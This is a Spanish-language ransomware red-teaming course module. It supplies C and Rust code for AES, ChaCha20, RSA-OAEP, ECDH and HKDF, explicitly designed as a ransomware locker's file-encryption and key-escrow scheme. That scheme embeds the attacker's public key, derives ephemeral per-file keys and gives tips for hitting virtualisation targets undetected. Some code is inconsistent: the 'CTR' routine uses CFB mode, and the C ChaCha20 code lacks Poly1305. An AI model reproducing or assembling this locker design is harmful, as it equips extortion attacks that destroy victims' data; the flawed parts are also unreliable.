---
title: "Ransomware Red Teaming — Módulo 2: Algoritmos Criptográficos"
description: "AES-256-CBC, ChaCha20-Poly1305, RSA-OAEP, ECDH y HKDF: el conjunto criptográfico detrás de los esquemas de cifrado del ransomware moderno."
author: Aldair Maihuiri
---
# Módulo 02 — Algoritmos Criptográficos


## 2.1 Criptografía Simétrica — AES

### AES-256-CBC (modo común en ransomware)

**Parámetros**:

- Key: 256 bits (32 bytes)
- IV: 128 bits (16 bytes) — uno por archivo, aleatorio
- Block size: 128 bits (16 bytes)
- Padding: PKCS#7

```
// === AES-256-CBC con Windows CNG (BCrypt) ===
// Ventaja: no dependencias externas, viene con Windows

#include <windows.h>
#include <bcrypt.h>
#pragma comment(lib, "bcrypt.lib")

typedef struct {
    BCRYPT_ALG_HANDLE hAlg;
    BCRYPT_KEY_HANDLE hKey;
    DWORD cbBlock;
    DWORD cbKeyObj;
    PBYTE pbKeyObj;
} AES_CTX;

BOOL AES_Init(AES_CTX *ctx, const BYTE *key, DWORD keyLen) {
    NTSTATUS status;
    DWORD cbResult = 0;

    // Abrir proveedor AES
    status = BCryptOpenAlgorithmProvider(
        &ctx->hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) return FALSE;

    // Obtener tamaño del objeto de clave
    status = BCryptGetProperty(ctx->hAlg, BCRYPT_OBJECT_LENGTH,
        (PBYTE)&ctx->cbKeyObj, sizeof(DWORD), &cbResult, 0);
    if (!BCRYPT_SUCCESS(status)) return FALSE;

    ctx->pbKeyObj = (PBYTE)HeapAlloc(GetProcessHeap(), 0, ctx->cbKeyObj);

    // Obtener tamaño de bloque
    BCryptGetProperty(ctx->hAlg, BCRYPT_BLOCK_LENGTH,
        (PBYTE)&ctx->cbBlock, sizeof(DWORD), &cbResult, 0);

    // Modo CBC
    BCryptSetProperty(ctx->hAlg, BCRYPT_CHAINING_MODE,
        (PBYTE)BCRYPT_CHAIN_MODE_CBC,
        sizeof(BCRYPT_CHAIN_MODE_CBC), 0);

    // Generar objeto de clave
    status = BCryptGenerateSymmetricKey(
        ctx->hAlg, &ctx->hKey, ctx->pbKeyObj, ctx->cbKeyObj,
        (PBYTE)key, keyLen, 0);

    return BCRYPT_SUCCESS(status);
}

// Cifrar buffer (in-place, con padding)
// Retorna tamaño del output (puede ser mayor por padding)
DWORD AES_Encrypt(AES_CTX *ctx, PBYTE iv,
                   PBYTE input, DWORD inputLen,
                   PBYTE output, DWORD outputBufSize) {
    DWORD cbCipherText = 0;
    NTSTATUS status;

    // Calcular tamaño con padding
    DWORD padded = ((inputLen / 16) + 1) * 16;
    if (outputBufSize < padded) return 0;

    // Copiar input al output (BCrypt puede trabajar in-place)
    memcpy(output, input, inputLen);

    status = BCryptEncrypt(
        ctx->hKey,
        output, inputLen,   // input
        NULL,               // padding info
        iv, 16,             // IV (se modifica → CBC chain)
        output, padded,     // output (in-place)
        &cbCipherText,
        BCRYPT_BLOCK_PADDING
    );

    return BCRYPT_SUCCESS(status) ? cbCipherText : 0;
}

DWORD AES_Decrypt(AES_CTX *ctx, PBYTE iv,
                   PBYTE input, DWORD inputLen,
                   PBYTE output, DWORD outputBufSize) {
    DWORD cbPlainText = 0;
    NTSTATUS status;

    memcpy(output, input, inputLen);

    status = BCryptDecrypt(
        ctx->hKey,
        output, inputLen,
        NULL,
        iv, 16,
        output, inputLen,
        &cbPlainText,
        BCRYPT_BLOCK_PADDING
    );

    return BCRYPT_SUCCESS(status) ? cbPlainText : 0;
}

void AES_Free(AES_CTX *ctx) {
    if (ctx->hKey)    BCryptDestroyKey(ctx->hKey);
    if (ctx->hAlg)    BCryptCloseAlgorithmProvider(ctx->hAlg, 0);
    if (ctx->pbKeyObj) HeapFree(GetProcessHeap(), 0, ctx->pbKeyObj);
}

// === AES-256-CBC en Rust (crate aes + cbc) ===

use aes::Aes256;
use cbc::{Encryptor, Decryptor};
use cbc::cipher::{BlockEncryptMut, BlockDecryptMut, KeyIvInit, block_padding::Pkcs7};

type Aes256CbcEnc = Encryptor<Aes256>;
type Aes256CbcDec = Decryptor<Aes256>;

pub fn aes256_encrypt(key: &[u8; 32], iv: &[u8; 16], data: &[u8]) -> Vec<u8> {
    // Calcular tamaño con padding PKCS7
    let padded_len = ((data.len() / 16) + 1) * 16;
    let mut buf = vec![0u8; padded_len];
    buf[..data.len()].copy_from_slice(data);

    let ct = Aes256CbcEnc::new(key.into(), iv.into())
        .encrypt_padded_mut::<Pkcs7>(&mut buf, data.len())
        .expect("encryption failed");
    ct.to_vec()
}

pub fn aes256_decrypt(key: &[u8; 32], iv: &[u8; 16], ciphertext: &[u8]) -> Vec<u8> {
    let mut buf = ciphertext.to_vec();
    let pt = Aes256CbcDec::new(key.into(), iv.into())
        .decrypt_padded_mut::<Pkcs7>(&mut buf)
        .expect("decryption failed");
    pt.to_vec()
}
```

> **¿Por qué AES-256-CBC y no otro modo para el primer código?** CBC (Cipher Block Chaining) fue el modo dominante en ransomware hasta 2020 por razones prácticas: aparece como el ejemplo más común en la documentación y tutoriales de OpenSSL y CNG/BCrypt, está bien documentado, y su comportamiento de padding es predecible — aunque en ambas APIs el modo de encadenamiento debe especificarse explícitamente, no viene activado por defecto. **A cada bloque de 16 bytes se le aplica XOR con el ciphertext del bloque anterior antes de cifrar**, haciendo que bloques idénticos de plaintext produzcan ciphertext diferente — propiedad importante porque los archivos tienen encabezados predecibles (PE headers, Office magic bytes). El IV aleatorio por archivo es crítico: sin él, dos archivos con el mismo inicio producirían el mismo ciphertext cifrado con la misma key, revelando información al analista. El costo de CBC es el padding PKCS#7 — cada archivo aumenta hasta 16 bytes, y la última operación de cifrado/descifrado requiere conocer el tamaño final primero. Esto lo hace menos ideal para archivos muy grandes o streaming.

### AES-CTR (modo stream — más rápido, sin padding)

```
// AES-256-CTR con BCrypt
// Ventaja: no requiere padding, puede cifrar cualquier tamaño

BOOL AES_CTR_Crypt(const BYTE *key, DWORD keyLen,
                    const BYTE *nonce, DWORD nonceLen,
                    PBYTE data, DWORD dataLen) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD cbKeyObj = 0, cbResult = 0;
    PBYTE pbKeyObj = NULL;
    BOOL success = FALSE;

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH,
        (PBYTE)&cbKeyObj, sizeof(DWORD), &cbResult, 0);
    pbKeyObj = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObj);

    // Modo CTR
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
        (PBYTE)BCRYPT_CHAIN_MODE_CFB,  // BCrypt no tiene CTR nativo → usar CFB
        sizeof(BCRYPT_CHAIN_MODE_CFB), 0);

    BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObj, cbKeyObj,
        (PBYTE)key, keyLen, 0);

    DWORD cbCipherText = 0;
    BCryptEncrypt(hKey, data, dataLen, NULL,
        (PBYTE)nonce, nonceLen, data, dataLen, &cbCipherText, 0);

    success = TRUE;
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    HeapFree(GetProcessHeap(), 0, pbKeyObj);
    return success;
}
```


## 2.2 ChaCha20-Poly1305 (Preferido en Ransomware Moderno)

### Por qué ChaCha20 sobre AES en ransomware

| Criterio | AES-256-CBC | ChaCha20-Poly1305 |
| - | - | - |
| Velocidad sin AES-NI | Lenta | Muy rápida |
| Velocidad con AES-NI | Muy rápida | Rápida |
| Autenticación | No (CBC puro) | Sí (Poly1305 MAC) |
| Padding | Requerido | No |
| Nonce size | 16 bytes | 12 bytes |
| Uso en ransomware | WannaCry, Revil | BlackCat, Akira |

ChaCha20 no usa AES-NI → igual de rápido en VMs antiguas/sistemas embedded.

```
// ChaCha20-Poly1305 en C (implementación manual)
// Windows no tiene BCrypt ChaCha20 nativo en todas las versiones
// Usamos implementación pura

#include <stdint.h>
#include <string.h>

// ChaCha20 quarter round
#define QR(a,b,c,d) \
    a += b; d ^= a; d = (d << 16) | (d >> 16); \
    c += d; b ^= c; b = (b << 12) | (b >> 20); \
    a += b; d ^= a; d = (d <<  8) | (d >> 24); \
    c += d; b ^= c; b = (b <<  7) | (b >> 25);

typedef struct {
    uint32_t state[16];
    uint8_t keystream[64];
    int pos;
} ChaCha20Ctx;

static void chacha20_block(uint32_t out[16], const uint32_t in[16]) {
    uint32_t x[16];
    memcpy(x, in, 64);

    for (int i = 0; i < 10; i++) {
        // Column rounds
        QR(x[0], x[4], x[8],  x[12]);
        QR(x[1], x[5], x[9],  x[13]);
        QR(x[2], x[6], x[10], x[14]);
        QR(x[3], x[7], x[11], x[15]);
        // Diagonal rounds
        QR(x[0], x[5], x[10], x[15]);
        QR(x[1], x[6], x[11], x[12]);
        QR(x[2], x[7], x[8],  x[13]);
        QR(x[3], x[4], x[9],  x[14]);
    }
    for (int i = 0; i < 16; i++) out[i] = x[i] + in[i];
}

void chacha20_init(ChaCha20Ctx *ctx,
                   const uint8_t key[32],
                   const uint8_t nonce[12],
                   uint32_t counter) {
    // Constante "expand 32-byte k"
    ctx->state[0]  = 0x61707865;
    ctx->state[1]  = 0x3320646e;
    ctx->state[2]  = 0x79622d32;
    ctx->state[3]  = 0x6b206574;

    // Key (little-endian)
    for (int i = 0; i < 8; i++) {
        ctx->state[4+i] = ((uint32_t)key[i*4])       |
                          ((uint32_t)key[i*4+1] << 8) |
                          ((uint32_t)key[i*4+2] << 16)|
                          ((uint32_t)key[i*4+3] << 24);
    }

    ctx->state[12] = counter;  // Block counter

    // Nonce (96-bit)
    for (int i = 0; i < 3; i++) {
        ctx->state[13+i] = ((uint32_t)nonce[i*4])       |
                           ((uint32_t)nonce[i*4+1] << 8) |
                           ((uint32_t)nonce[i*4+2] << 16)|
                           ((uint32_t)nonce[i*4+3] << 24);
    }

    ctx->pos = 64;  // Forzar generación del primer bloque
}

void chacha20_crypt(ChaCha20Ctx *ctx, uint8_t *data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        if (ctx->pos == 64) {
            // Generar nuevo bloque de keystream
            uint32_t block[16];
            chacha20_block(block, ctx->state);
            memcpy(ctx->keystream, block, 64);
            ctx->state[12]++;  // Incrementar contador
            ctx->pos = 0;
        }
        data[i] ^= ctx->keystream[ctx->pos++];
    }
}

// ChaCha20-Poly1305 en Rust (crate chacha20poly1305)

use chacha20poly1305::{
    aead::{Aead, AeadCore, KeyInit, OsRng},
    ChaCha20Poly1305, Nonce, Key
};

pub struct ChaChaCipher {
    cipher: ChaCha20Poly1305,
}

impl ChaChaCipher {
    pub fn new(key: &[u8; 32]) -> Self {
        let cipher = ChaCha20Poly1305::new(Key::from_slice(key));
        Self { cipher }
    }

    pub fn encrypt(&self, nonce: &[u8; 12], data: &[u8]) -> Vec<u8> {
        let nonce = Nonce::from_slice(nonce);
        self.cipher.encrypt(nonce, data).expect("encryption failure")
    }

    pub fn decrypt(&self, nonce: &[u8; 12], ciphertext: &[u8]) -> Vec<u8> {
        let nonce = Nonce::from_slice(nonce);
        self.cipher.decrypt(nonce, ciphertext).expect("decryption failure")
    }

    // Generar nonce aleatorio
    pub fn random_nonce() -> [u8; 12] {
        let nonce = ChaCha20Poly1305::generate_nonce(&mut OsRng);
        nonce.into()
    }

    // Generar key aleatoria
    pub fn random_key() -> [u8; 32] {
        let key = ChaCha20Poly1305::generate_key(&mut OsRng);
        key.into()
    }
}
```

> **¿Por qué ChaCha20-Poly1305 se convirtió en el algoritmo preferido de ransomware moderno?** La razón no es puramente técnica — es operacional. AES acelerado por hardware (AES-NI) es más rápido en CPUs Intel/AMD con soporte nativo. El problema: los targets más valiosos de ransomware en 2022-2026 son VMware ESXi y servidores Linux en virtualización, donde AES-NI frecuentemente está deshabilitado o no expuesto a la VM huésped. En esas condiciones, AES-CTR cae a ~300 MB/s (software puro) mientras ChaCha20 mantiene ~800-1000 MB/s porque su diseño (ADD-ROTATE-XOR sobre registros de 32 bits) es eficiente en cualquier CPU sin instrucciones especializadas. La capa Poly1305 es autenticación integrada (AEAD): si un bit del ciphertext es modificado (honeypot, EDR que altera datos en vuelo), el MAC falla y el descifrado aborta — protección contra tampering que AES-CBC puro no tiene. BlackCat/ALPHV y Akira adoptaron ChaCha20 específicamente para maximizar velocidad en targets de virtualización.


## 2.3 RSA — Criptografía Asimétrica

### RSA-OAEP (para cifrar claves simétricas)

```
// RSA-OAEP con Windows CNG

// Cifrar hasta 190 bytes (RSA-2048 con OAEP-SHA256)
DWORD RSA_OAEP_Encrypt(PBYTE publicKeyBlob, DWORD publicKeyBlobLen,
                        const BYTE *plaintext, DWORD plaintextLen,
                        PBYTE ciphertext, DWORD ciphertextBufLen) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    DWORD cbCiphertext = 0;

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RSA_ALGORITHM, NULL, 0);

    // Importar clave pública desde blob
    status = BCryptImportKeyPair(hAlg, NULL, BCRYPT_RSAPUBLIC_BLOB,
        &hKey, publicKeyBlob, publicKeyBlobLen, 0);
    if (!BCRYPT_SUCCESS(status)) goto cleanup;

    // OAEP con SHA-256
    BCRYPT_OAEP_PADDING_INFO paddingInfo = {
        .pszAlgId = BCRYPT_SHA256_ALGORITHM,
        .pbLabel = NULL,
        .cbLabel = 0
    };

    status = BCryptEncrypt(hKey,
        (PBYTE)plaintext, plaintextLen,
        &paddingInfo,
        NULL, 0,  // No IV para RSA
        ciphertext, ciphertextBufLen,
        &cbCiphertext,
        BCRYPT_PAD_OAEP);

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return BCRYPT_SUCCESS(status) ? cbCiphertext : 0;
}

// Exportar clave pública a blob BCrypt desde PEM
// (para importar la clave del atacante embebida en el binario)
// Formato: BCRYPT_RSAKEY_BLOB + exponent + modulus

typedef struct {
    BCRYPT_RSAKEY_BLOB header;
    BYTE publicExponent[3];  // 0x01 0x00 0x01 = 65537
    BYTE modulus[256];       // 2048 bits
} RSA2048_PUBLIC_BLOB;

// RSA-OAEP en Rust (crate rsa)

use rsa::{RsaPublicKey, RsaPrivateKey, Oaep, pkcs8::DecodePublicKey};
use sha2::Sha256;
use rand::rngs::OsRng;

pub fn rsa_encrypt_key(public_key_pem: &str, data: &[u8]) -> Vec<u8> {
    let public_key = RsaPublicKey::from_public_key_pem(public_key_pem)
        .expect("Invalid PEM");

    let mut rng = OsRng;
    let padding = Oaep::new::<Sha256>();

    public_key.encrypt(&mut rng, padding, data)
        .expect("RSA encryption failed")
}

pub fn rsa_decrypt_key(private_key_pem: &str, ciphertext: &[u8]) -> Vec<u8> {
    use rsa::pkcs8::DecodePrivateKey;
    let private_key = RsaPrivateKey::from_pkcs8_pem(private_key_pem)
        .expect("Invalid PEM");

    let padding = Oaep::new::<Sha256>();
    private_key.decrypt(padding, ciphertext)
        .expect("RSA decryption failed")
}

// Generar par de claves RSA-2048
pub fn generate_rsa_keypair() -> (String, String) {
    let mut rng = OsRng;
    let private_key = RsaPrivateKey::new(&mut rng, 2048)
        .expect("Failed to generate key");
    let public_key = RsaPublicKey::from(&private_key);

    use rsa::pkcs8::{EncodePrivateKey, EncodePublicKey};
    let priv_pem = private_key.to_pkcs8_pem(rsa::pkcs8::LineEnding::LF)
        .unwrap().to_string();
    let pub_pem = public_key.to_public_key_pem(rsa::pkcs8::LineEnding::LF)
        .unwrap();

    (priv_pem, pub_pem)
}
```

> **¿Por qué RSA-OAEP y no RSA-PKCS1v1.5 para cifrar claves simétricas?** PKCS#1 v1.5 es vulnerable al "Bleichenbacher attack" (1998): un oráculo que responde diferente ante "padding inválido" vs "otros errores" permite a un atacante recuperar el plaintext cifrado sin la clave privada, con suficientes intentos (~1 millón de queries). En un sistema donde el decryptor da feedback sobre si la clave fue descifrada correctamente, PKCS1v1.5 sería explotable. OAEP (Optimal Asymmetric Encryption Padding) usa randomización y hashing para eliminar esta vulnerabilidad estructural. Para ransomware, la elección tiene implicaciones adicionales: el decryptor entregado a la víctima no debería revelar si el intento de descifrado falló por "clave incorrecta" o "padding inválido" — la respuesta unificada "descifrado fallido" bloquea el oracle. El límite práctico de RSA-2048 con OAEP-SHA256 es ~190 bytes de plaintext, suficiente para proteger una clave AES de 32 bytes pero no para datos directos.


## 2.4 ECDH + Curva X25519/P-256 (Estado del Arte)

### Por qué ECDH en lugar de RSA

| RSA-2048 | ECDH-P256 |
| - | - |
| 2048-bit key | 256-bit key |
| Lento en keygen | Muy rápido |
| Gran overhead | Pequeño |
| Bien estudiado | Igual de seguro |

Ransomware moderno (BlackCat, Akira) usa ECDH.

### Multi-Master Pattern (MMP) — Cómo lo usan

```
SETUP (Builder, atacante):
  master_priv, master_pub = ECDH_keygen()
  # master_priv → C2 del atacante
  # master_pub  → embebido en binario del ransomware

RUNTIME (Locker, en víctima):
  For each file:
    file_priv, file_pub = ECDH_keygen()  # Par efímero por archivo
    shared_secret = ECDH(file_priv, master_pub)  # ECDH con master
    file_key = KDF(shared_secret)         # Derivar AES key
    encrypt(file, file_key)
    write_footer(file_pub)                # Guardar clave pública del archivo
    # file_priv → DESTRUIR inmediatamente

DESCIFRADO (Atacante):
  For each file:
    file_pub = read_footer(file)
    shared_secret = ECDH(master_priv, file_pub)  # Solo el atacante puede
    file_key = KDF(shared_secret)
    decrypt(file, file_key)

// ECDH con Windows CNG (P-256)

#include <bcrypt.h>

BOOL ECDH_GenerateKeyPair(BCRYPT_KEY_HANDLE *phKey,
                           PBYTE *ppubKeyBlob, DWORD *pcbPubKey) {
    BCRYPT_ALG_HANDLE hAlg;
    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_ECDH_P256_ALGORITHM, NULL, 0);
    BCryptGenerateKeyPair(hAlg, phKey, 256, 0);
    BCryptFinalizeKeyPair(*phKey, 0);

    // Exportar clave pública
    BCryptExportKey(*phKey, NULL, BCRYPT_ECCPUBLIC_BLOB, NULL, 0, pcbPubKey, 0);
    *ppubKeyBlob = (PBYTE)HeapAlloc(GetProcessHeap(), 0, *pcbPubKey);
    BCryptExportKey(*phKey, NULL, BCRYPT_ECCPUBLIC_BLOB,
        *ppubKeyBlob, *pcbPubKey, pcbPubKey, 0);

    BCryptCloseAlgorithmProvider(hAlg, 0);
    return TRUE;
}

// Calcular shared secret ECDH
BOOL ECDH_ComputeShared(BCRYPT_KEY_HANDLE hMyPrivKey,
                         PBYTE peerPubKeyBlob, DWORD peerPubKeyBlobLen,
                         PBYTE *ppSharedSecret, DWORD *pcbSharedSecret) {
    BCRYPT_ALG_HANDLE hAlg;
    BCRYPT_KEY_HANDLE hPeerKey;
    BCRYPT_SECRET_HANDLE hSecret;

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_ECDH_P256_ALGORITHM, NULL, 0);

    // Importar clave pública del peer
    BCryptImportKeyPair(hAlg, NULL, BCRYPT_ECCPUBLIC_BLOB,
        &hPeerKey, peerPubKeyBlob, peerPubKeyBlobLen, 0);

    // Calcular shared secret
    BCryptSecretAgreement(hMyPrivKey, hPeerKey, &hSecret, 0);

    // Derivar material de clave (KDF)
    BCryptDeriveKey(hSecret, BCRYPT_KDF_HASH, NULL,
        NULL, 0, pcbSharedSecret, 0);
    *ppSharedSecret = (PBYTE)HeapAlloc(GetProcessHeap(), 0, *pcbSharedSecret);
    BCryptDeriveKey(hSecret, BCRYPT_KDF_HASH, NULL,
        *ppSharedSecret, *pcbSharedSecret, pcbSharedSecret, 0);

    BCryptDestroySecret(hSecret);
    BCryptDestroyKey(hPeerKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return TRUE;
}

// X25519 ECDH en Rust (más rápido que P-256)

use x25519_dalek::{EphemeralSecret, PublicKey, StaticSecret};
use rand_core::OsRng;
use sha2::{Sha256, Digest};

pub struct ECDHKeyPair {
    secret: StaticSecret,
    pub public: PublicKey,
}

impl ECDHKeyPair {
    pub fn generate() -> Self {
        let secret = StaticSecret::random_from_rng(OsRng);
        let public = PublicKey::from(&secret);
        Self { secret, public }
    }

    // Computed shared secret + KDF → AES key
    pub fn derive_file_key(&self, peer_public: &[u8; 32]) -> [u8; 32] {
        let peer_pub = PublicKey::from(*peer_public);
        let shared = self.secret.diffie_hellman(&peer_pub);

        // KDF: SHA-256 del shared secret
        let mut hasher = Sha256::new();
        hasher.update(shared.as_bytes());
        let result = hasher.finalize();

        let mut key = [0u8; 32];
        key.copy_from_slice(&result);
        key
    }

    pub fn public_bytes(&self) -> [u8; 32] {
        *self.public.as_bytes()
    }
}

// Ejemplo de uso en el locker:
pub fn encrypt_file_ecdh(
    master_public_bytes: &[u8; 32],  // Embebido en binario
    file_data: &[u8]
) -> (Vec<u8>, [u8; 32]) {  // (ciphertext, ephemeral_pub_to_store_in_footer)

    // Generar par efímero para este archivo
    let ephemeral = ECDHKeyPair::generate();

    // Derivar clave AES del shared secret
    let file_key = ephemeral.derive_file_key(master_public_bytes);
    let nonce = ChaChaCipher::random_nonce();

    let cipher = ChaChaCipher::new(&file_key);
    let ciphertext = cipher.encrypt(&nonce, file_data);

    // La clave pública efímera va al footer del archivo
    // El atacante puede reconstruir el shared secret con su master_private
    (ciphertext, ephemeral.public_bytes())
}
```

> **¿Por qué el Multi-Master Pattern (MMP) con ECDH efímero por archivo y no una sola key ECDH por sesión?** El diseño de una key por sesión crea una vulnerabilidad crítica: si el investigador o la víctima puede extraer la clave de sesión de alguna manera (dump de memoria, reverse engineering del handshake con C2), todos los archivos de esa sesión son recuperables. Con el MMP y keypairs efímeros por archivo, comprometer una clave de archivo afecta solo ese archivo. Adicionalmente, el MMP no requiere comunicación con el C2 durante el cifrado — el locker genera un par efímero localmente, calcula el shared secret con la `master_pub` embebida, deriva la `file_key`, cifra, destruye la clave privada efímera, y almacena solo la pública en el footer. Todo esto sin un solo byte enviado a ningún servidor durante la operación. Esto es crucial para operaciones air-gapped y para no generar tráfico de red detectable durante el cifrado. El precio: el footer debe contener 32-72 bytes de clave pública por archivo, y el atacante necesita su `master_priv` para descifrar — si pierde esa clave, nadie puede descifrar jamás.


## 2.5 HKDF — Key Derivation Function

Cuando tienes un shared secret de ECDH, necesitas derivar claves de calidad criptográfica.

```
// HKDF-SHA256 simple (extract + expand)

#include <bcrypt.h>
#include <string.h>

// HMAC-SHA256
void HMAC_SHA256(const BYTE *key, DWORD keyLen,
                  const BYTE *data, DWORD dataLen,
                  BYTE output[32]) {
    BCRYPT_ALG_HANDLE hAlg;
    BCRYPT_HASH_HANDLE hHash;
    DWORD cbHash = 0, cbResult = 0;

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM,
        NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG);

    DWORD cbHashObj;
    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH,
        (PBYTE)&cbHashObj, sizeof(DWORD), &cbResult, 0);
    PBYTE pbHashObj = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbHashObj);

    BCryptCreateHash(hAlg, &hHash, pbHashObj, cbHashObj,
        (PBYTE)key, keyLen, 0);
    BCryptHashData(hHash, (PBYTE)data, dataLen, 0);
    BCryptFinishHash(hHash, output, 32, 0);

    BCryptDestroyHash(hHash);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    HeapFree(GetProcessHeap(), 0, pbHashObj);
}

// HKDF-Extract: PRK = HMAC-SHA256(salt, IKM)
void HKDF_Extract(const BYTE *salt, DWORD saltLen,
                   const BYTE *ikm, DWORD ikmLen,
                   BYTE prk[32]) {
    BYTE defaultSalt[32] = {0};  // Si no hay salt, usar ceros
    if (!salt || saltLen == 0) {
        salt = defaultSalt;
        saltLen = 32;
    }
    HMAC_SHA256(salt, saltLen, ikm, ikmLen, prk);
}

// HKDF-Expand: OKM = T(1) || T(2) || ...
void HKDF_Expand(const BYTE prk[32], const BYTE *info, DWORD infoLen,
                  BYTE *okm, DWORD okmLen) {
    BYTE t[32] = {0};
    DWORD pos = 0;
    BYTE counter = 1;

    while (pos < okmLen) {
        // Input = T(i-1) || info || counter
        BYTE hmac_input[32 + 256 + 1];
        DWORD hmac_input_len = 0;
        if (counter > 1) {
            memcpy(hmac_input, t, 32);
            hmac_input_len = 32;
        }
        memcpy(hmac_input + hmac_input_len, info, infoLen);
        hmac_input_len += infoLen;
        hmac_input[hmac_input_len++] = counter;

        HMAC_SHA256(prk, 32, hmac_input, hmac_input_len, t);

        DWORD copy = min(32, okmLen - pos);
        memcpy(okm + pos, t, copy);
        pos += copy;
        counter++;
    }
}

// Uso: derivar AES key e IV desde shared secret ECDH
void DeriveKeys(const BYTE *sharedSecret, DWORD secretLen,
                 BYTE aesKey[32], BYTE aesIV[16]) {
    BYTE prk[32];
    BYTE okm[48];  // 32 (key) + 16 (IV) = 48 bytes

    HKDF_Extract(NULL, 0, sharedSecret, secretLen, prk);
    HKDF_Expand(prk, (BYTE*)"ransomware-key", 14, okm, 48);

    memcpy(aesKey, okm, 32);
    memcpy(aesIV, okm + 32, 16);
}
```

> **¿Por qué el shared secret de ECDH no puede usarse directamente como clave AES?** El output de ECDH es una coordenada X de una curva elíptica — un número con estructura matemática específica, no una cadena de bits uniformemente aleatoria. Algunas propiedades problemáticas: los bits bajos pueden tener sesgo estadístico dependiendo de la curva, el tamaño es fijo (32 bytes para P-256/X25519) pero puede necesitar expandirse a más material de clave (AES key + IV + MAC key), y usar el mismo input con contextos diferentes (cifrado, autenticación) crea riesgos de related-key attacks. HKDF (RFC 5869) resuelve todo esto en dos pasos: Extract (HMAC del IKM con salt, produce PRK con distribución uniforme) y Expand (generación de longitud arbitraria con contexto/info, permite derivar múltiples keys independientes del mismo secreto). En el contexto del footer: `DeriveKeys(shared_secret)` produce 48 bytes — los primeros 32 son la AES key, los últimos 16 son el IV, ambos con propiedades de independencia estadística que el shared secret crudo no garantiza.


## 2.6 Generación Aleatoria Segura (CSPRNG)

Un PRNG débil hace que las claves de cifrado sean predecibles — sin importar qué tan fuerte sea el algoritmo de cifrado que las use.

```
// Correcto: BCryptGenRandom (CSPRNG)

BOOL GenerateRandomBytes(PBYTE buffer, DWORD length) {
    return BCRYPT_SUCCESS(
        BCryptGenRandom(NULL, buffer, length, BCRYPT_USE_SYSTEM_PREFERRED_RNG)
    );
}

// Generar key y IV para un archivo
void GenerateFileKeyIV(BYTE key[32], BYTE iv[16]) {
    BCryptGenRandom(NULL, key, 32, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    BCryptGenRandom(NULL, iv, 16, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
}

// INCORRECTO — nunca usar en producción criptográfica:
// srand(time(NULL)); rand();  ← predecible, no criptográficamente seguro

// Rust: OsRng siempre es CSPRNG

use rand::{RngCore, rngs::OsRng};

pub fn random_bytes<const N: usize>() -> [u8; N] {
    let mut buf = [0u8; N];
    OsRng.fill_bytes(&mut buf);
    buf
}

pub fn generate_key_iv() -> ([u8; 32], [u8; 12]) {
    (random_bytes::<32>(), random_bytes::<12>())
}
```

**¿Por qué un PRNG débil es tan devastador y no solo un "detalle de implementación"?** Un error clásico en ransomware amateur es sembrar un generador no criptográfico (`rand()`, `Math.random()`, etc.) con una fuente predecible como el timestamp de infección. El problema en cascada: (1) el timestamp del proceso puede extraerse del sistema de archivos (creation time del `.exe`, timestamps de los archivos cifrados); (2) con una ventana de tiempo estimada de la infección, un investigador puede hacer fuerza bruta del seed probando cada segundo posible — con una ventana de 24 horas, solo ~86.400 valores; (3) el criptoanálisis no necesita romper AES-256 (computacionalmente imposible) sino el generador débil que produjo las keys.

Un caso real de este tipo de fallo es **Petya (2016)**, cuyo algoritmo de generación de clave era tan defectuoso que permitía predecir la mitad del keystream usado — el investigador @leostone construyó un algoritmo genético capaz de recuperar la clave de descifrado en apenas ~7 segundos, sin necesidad de atacar AES ni la clave del atacante.

`BCryptGenRandom` con `BCRYPT_USE_SYSTEM_PREFERRED_RNG` usa el CSPRNG por defecto de Windows CNG — un **CTR_DRBG basado en AES conforme al estándar NIST SP800-90**, alimentado con entropía real del sistema — el único apropiado para uso criptográfico. La diferencia en el código: 2 líneas. El impacto: la diferencia entre "recuperación imposible sin C2" y "recuperación total sin pagar".


## 2.7 Comparativa de Velocidad (Benchmarks Reales)

Para un archivo de 1 GB en hardware moderno (i7-12700, AES-NI habilitado):

| Algoritmo | Velocidad | Observación |
| - | - | - |
| AES-256-CTR (AES-NI) | ~2.5 GB/s | Más rápido con hardware |
| AES-256-CBC (AES-NI) | ~2.0 GB/s | Padding overhead |
| ChaCha20-Poly1305 | ~1.8 GB/s | Sin AES-NI: igual o más rápido |
| AES-256-CTR (sin AES-NI) | ~300 MB/s | Muy lento en VMs sin AES-NI |

Conclusión: si el ransomware debe correr en hardware variado (incluyendo VMs sin AES-NI), ChaCha20-Poly1305 ofrece un rendimiento más consistente. Si el objetivo son endpoints Windows modernos con CPUs recientes, AES-256-CTR con AES-NI sigue siendo la opción más rápida.


## Resumen Módulo 02

| Algoritmo | Uso | API Windows |
| - | - | - |
| AES-256-CBC | Cifrar archivos (legacy) | BCrypt CBC |
| AES-256-CTR | Cifrar archivos (sin padding) | Manual (ECB block-a-block + contador, CNG no expone CTR nativo) |
| ChaCha20-Poly1305 | Cifrar archivos (moderno) | Manual o crate Rust |
| RSA-2048-OAEP | Cifrar claves simétricas | BCrypt RSA |
| ECDH-P256/X25519 | Esquema de clave pública efímera | BCrypt ECDH / crate |
